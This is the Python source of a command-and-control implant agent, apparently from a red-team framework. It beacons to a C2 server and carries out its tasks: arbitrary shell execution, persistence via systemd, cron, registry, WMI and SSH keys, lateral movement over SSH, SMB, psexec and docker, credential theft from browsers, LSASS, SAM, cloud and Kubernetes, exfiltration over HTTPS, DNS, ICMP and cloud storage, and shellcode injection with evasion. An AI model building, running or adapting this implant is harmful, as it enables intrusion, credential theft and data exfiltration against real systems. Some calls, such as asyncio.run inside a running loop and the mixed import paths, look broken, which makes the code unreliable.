import asyncio, json, os, platform, hashlib, time, uuid, base64, sys, re
from agent.crypto import decrypt, generate_keypair
import httpx
from agent.modules.persistence import Persistence
from agent.modules.lateral import LateralMovement
from agent.modules.credtheft import CredentialTheft
from agent.modules.exfil import Exfiltration
from agent.modules.stealth import Stealth as AdvancedStealth
from agent.modules.inject import Injector
from agent.modules.audit import setup_agent_safety, KillSwitch, AuditLogger, IntegrityMonitor, ForensicCollector

C2_URL = os.getenv("C2_URL", "http://c2-server:8081")
INTERVAL = 30
EGRESS_STRATEGY = os.getenv("EGRESS_STRATEGY", "auto")
REDACT_PATTERNS = os.getenv("REDACT_PATTERNS", "")
_redact_re = re.compile(REDACT_PATTERNS, re.IGNORECASE) if REDACT_PATTERNS else None

try:
    from orchestrator.egress.router import EgressRouter
    _router = EgressRouter(strategy=EGRESS_STRATEGY)
except ImportError:
    _router = None

AGENT_DIR = os.path.dirname(os.path.abspath(__file__))

def _validate_config():
    if not C2_URL.startswith(("http://", "https://")):
        raise RuntimeError(f"Invalid C2_URL: {C2_URL}")
    hwid = asyncio.run(get_hwid())
    if len(hwid) < 8:
        raise RuntimeError(f"HWID too short ({len(hwid)} chars), collision risk")

def _redact(text: str) -> str:
    if _redact_re:
        return _redact_re.sub("[REDACTED]", text)
    return text

async def get_hwid() -> str:
    data = ""
    for path in ["/etc/machine-id", "/etc/hostname"]:
        try:
            data += open(path).read().strip()
        except Exception:
            pass
    data += hex(uuid.getnode())
    return hashlib.sha256(data.encode()).hexdigest()[:16]

async def register() -> tuple[str, bytes]:
    hwid = await get_hwid()
    pk, sk = generate_keypair()
    async with (_router.get_client() if _router else httpx.AsyncClient()) as client:
        resp = await client.post(f"{C2_URL}/v1/agent/register", json={
            "hwid": hwid,
            "pubkey": base64.b64encode(pk).decode(),
        })
        if resp.status_code == 201:
            data = resp.json()
            session_key = decrypt(sk, data["session_key"])
            return data["agent_id"], session_key
    raise RuntimeError("Registration failed")

async def heartbeat(agent_id: str, session_key: bytes) -> list[dict]:
    payload = base64.b64encode(json.dumps({"agent_id": agent_id, "status": "idle", "ts": time.time()}).encode()).decode()
    async with (_router.get_client() if _router else httpx.AsyncClient()) as client:
        resp = await client.post(f"{C2_URL}/v1/agent/beat", json={"data": payload})
        if resp.status_code == 200:
            data = resp.json()
            return data.get("tasks", [])
        return []

async def execute_task(task: dict) -> dict:
    ttype = task.get("type", "exec")
    payload = task.get("payload", {})
    if ttype == "exec":
        import subprocess
        try:
            r = subprocess.run(payload.get("command", "whoami"), shell=True, capture_output=True, text=True, timeout=payload.get("timeout", 30))
            return {"stdout": r.stdout, "stderr": r.stderr, "code": r.returncode}
        except subprocess.TimeoutExpired:
            return {"error": "timeout"}
        except Exception as e:
            return {"error": str(e)}
    elif ttype == "upload":
        path = payload.get("path", "")
        try:
            with open(path, "rb") as f:
                data = base64.b64encode(f.read()).decode()
            return {"path": path, "data": data}
        except Exception as e:
            return {"error": str(e)}
    elif ttype == "sleep":
        await asyncio.sleep(payload.get("duration", 3600))
        return {"slept": True}
    elif ttype == "uninstall":
        confirm = payload.get("confirm_uninstall", False)
        if not confirm:
            return {"error": "uninstall requires confirm_uninstall: true"}
        import shutil
        try:
            shutil.rmtree(os.path.dirname(os.path.abspath(__file__)), ignore_errors=True)
        except Exception:
            pass
        os._exit(0)
    elif ttype == "persistence":
        method = payload.get("method", "install_all")
        if method == "install_all":
            result = Persistence.install_all()
        elif method == "systemd":
            result = [("systemd", Persistence.install_systemd())]
        elif method == "cron":
            result = [("cron", Persistence.install_cron())]
        elif method == "ld_preload":
            result = [("ld_preload", Persistence.install_ld_preload())]
        elif method == "registry":
            result = [("registry", Persistence.install_registry_run())]
        elif method == "scheduled_task":
            result = [("scheduled_task", Persistence.install_scheduled_task())]
        elif method == "wmi_event":
            result = [("wmi_event", Persistence.install_wmi_event())]
        elif method == "ssh_key":
            result = [("ssh_key", Persistence.install_ssh_key(payload.get("public_key")))]
        else:
            result = [("error", {"status": False, "detail": f"Unknown persistence method: {method}"})]
        return {"results": result}

    elif ttype == "lateral":
        method = payload.get("method", "autonomous")
        target = payload.get("target")
        username = payload.get("username", "root")
        password = payload.get("password", "")
        hash = payload.get("hash")
        cmd = payload.get("command")

        if method == "autonomous":
            result = asyncio.run(LateralMovement.autonomous_campaign(
                targets=payload.get("targets"),
            ))
        elif method == "ssh":
            result = asyncio.run(LateralMovement.ssh(target, username, password, cmd))
        elif method == "wmi":
            result = asyncio.run(LateralMovement.wmi(target, username, password, hash, cmd))
        elif method == "psexec":
            binary_b64 = payload.get("binary_b64")
            binary = base64.b64decode(binary_b64) if binary_b64 else None
            result = asyncio.run(LateralMovement.psexec(target, username, password, hash, binary))
        elif method == "smb":
            result = asyncio.run(LateralMovement.smb_exec(target, username, password, hash, cmd))
        elif method == "docker":
            result = asyncio.run(LateralMovement.docker_socket(target))
        elif method == "harvest":
            result = LateralMovement._harvest_credentials()
            result["_method"] = "credential_harvest"
        else:
            result = {"status": False, "detail": f"Unknown lateral method: {method}"}
        return {"result": result}

    elif ttype == "credtheft":
        method = payload.get("method", "steal_all")
        if method == "steal_all":
            result = CredentialTheft.steal_all()
        elif method == "browsers":
            result = CredentialTheft.steal_browser_credentials()
        elif method == "lsass":
            result = CredentialTheft.steal_lsass_dump()
        elif method == "sam":
            result = CredentialTheft.steal_sam_hives()
        elif method == "ssh":
            result = CredentialTheft.steal_ssh_keys()
        elif method == "kubernetes":
            result = CredentialTheft.steal_kubernetes_tokens()
        elif method == "cloud":
            result = CredentialTheft.steal_cloud_credentials()
        elif method == "env":
            result = CredentialTheft.steal_env_vars()
        elif method == "configs":
            result = CredentialTheft.steal_config_files()
        else:
            result = {"status": False, "detail": f"Unknown credtheft method: {method}"}
        return {"result": result}

    elif ttype == "exfil":
        method = payload.get("method", "https")
        data_raw = payload.get("data")
        if isinstance(data_raw, str):
            try:
                data_bytes = base64.b64decode(data_raw)
            except Exception:
                data_bytes = data_raw.encode()
        else:
            data_bytes = json.dumps(data_raw).encode()

        config = payload.get("config", {})

        if method == "https":
            result = asyncio.run(Exfiltration.via_https(
                data_bytes,
                target_url=config.get("url", "https://localhost:9999/collect"),
                key=config.get("key"),
                camouflage_as=config.get("camouflage", "analytics"),
            ))
        elif method == "dns":
            result = asyncio.run(Exfiltration.via_dns(
                data_bytes,
                domain=config.get("domain", "exfil.example.com"),
                key=config.get("key"),
            ))
        elif method == "icmp":
            result = asyncio.run(Exfiltration.via_icmp(
                data_bytes,
                target_ip=config.get("target_ip", "10.0.0.1"),
                key=config.get("key"),
            ))
        elif method == "deaddrop":
            result = asyncio.run(Exfiltration.via_deaddrop(
                data_bytes,
                drop_urls=config.get("drop_urls", []),
                key=config.get("key"),
            ))
        elif method == "cloud":
            result = asyncio.run(Exfiltration.via_cloud(
                data_bytes,
                provider=config.get("provider", "aws"),
                bucket=config.get("bucket", ""),
                key=config.get("key"),
                credentials=config.get("credentials", {}),
            ))
        else:
            result = {"status": False, "detail": f"Unknown exfil method: {method}"}
        return {"result": result}

    elif ttype == "sandbox_check":
        result = AdvancedStealth.sandbox_detect()
        return {"result": result}

    elif ttype == "inject":
        method = payload.get("method", "shellcode")
        
        if method == "shellcode":
            shellcode = base64.b64decode(payload.get("shellcode_b64", ""))
            if not shellcode:
                output = {"error": "no_shellcode"}
            else:
                target_pid = payload.get("pid")
                if not target_pid:
                    target = payload.get("target", "dllhost.exe")
                    target_pid = Injector.create_sacrificial_process(target)
                
                if target_pid:
                    ppid = payload.get("ppid_spoof")
                    success = Injector.inject_shellcode(target_pid, shellcode, ppid)
                    output = {
                        "success": success,
                        "pid": target_pid,
                        "size": len(shellcode),
                    }
                else:
                    output = {"error": "could_not_create_target"}
        
        elif method == "dll":
            dll_path = payload.get("dll_path")
            pid = payload.get("pid")
            ppid = payload.get("ppid_spoof")
            success = Injector.inject_dll(pid, dll_path, ppid)
            output = {"success": success}
        
        else:
            output = {"error": f"unknown_method: {method}"}
        
        return {"task_id": task.get("id"), "result": output}
    
    elif ttype == "sleep_mask":
        duration = payload.get("duration", 60)
        AdvancedStealth.sleep_mask(duration)
        output = {"slept": True, "duration": duration}
        return {"task_id": task.get("id"), "result": output}
    
    elif ttype == "stealth_init":
        results = AdvancedStealth.initialize_all()
        output = {"stealth_results": results}
        return {"task_id": task.get("id"), "result": output}
    
    elif ttype == "stealth_status":
        from modules.syscall import get_resolver
        resolver = get_resolver()
        output = {"resolver_status": resolver.get_status()}
        return {"task_id": task.get("id"), "result": output}
    
    elif ttype == "stack_spoof":
        from modules.stealth import AdvancedStealth
        context = AdvancedStealth.spoof_call_stack()
        output = {"spoofed": context is not None}
        return {"task_id": task.get("id"), "result": output}

async def submit_result(agent_id: str, session_key: bytes, task_id: str, result: dict):
    redacted = {k: (_redact(v) if isinstance(v, str) else v) for k, v in result.items()}
    async with (_router.get_client() if _router else httpx.AsyncClient()) as client:
        await client.post(f"{C2_URL}/v1/agent/result", json={
            "agent_id": agent_id, "task_id": task_id, "result": redacted,
        })

async def main():
    _validate_config()
    agent_id, session_key = await register()
    
    # Initialize safety infrastructure (kill switch, audit, integrity)
    kill_switch, audit_logger, integrity_monitor, forensic_collector = setup_agent_safety(
        agent_id=agent_id,
        session_id=session_key.hex() if isinstance(session_key, bytes) else session_key,
        agent_dir=AGENT_DIR,
        kill_switch_interval=3600,
    )
    
    # Run initial stealth initialization
    AdvancedStealth.initialize_all()
    
    while True:
        # Verify integrity before each beacon
        ok, violations = integrity_monitor.verify_all()
        if not ok:
            audit_logger.log(
                event_type="integrity_fail",
                agent_id=agent_id,
                session_id=session_key.hex() if isinstance(session_key, bytes) else session_key,
                command="integrity_check",
                result="fail",
                details={"violations": violations},
            )
            kill_switch.trigger(KillSwitch.TriggerReason.INTEGRITY_FAILURE)
            return
        
        tasks = await heartbeat(agent_id, session_key)
        for task in tasks:
            result = await execute_task(task)
            await submit_result(agent_id, session_key, task["id"], result)
            
            # Audit log task execution
            audit_logger.log(
                event_type="task_executed",
                agent_id=agent_id,
                session_id=session_key.hex() if isinstance(session_key, bytes) else session_key,
                command=task.get("type", "unknown"),
                result="success" if "error" not in result else "fail",
                details={"task_id": task["id"], "result_keys": list(result.keys())},
            )
        
        # Reset dead man's switch on successful beacon
        kill_switch.reset_dead_man_switch()
        await asyncio.sleep(INTERVAL)

if __name__ == "__main__":
    asyncio.run(main())
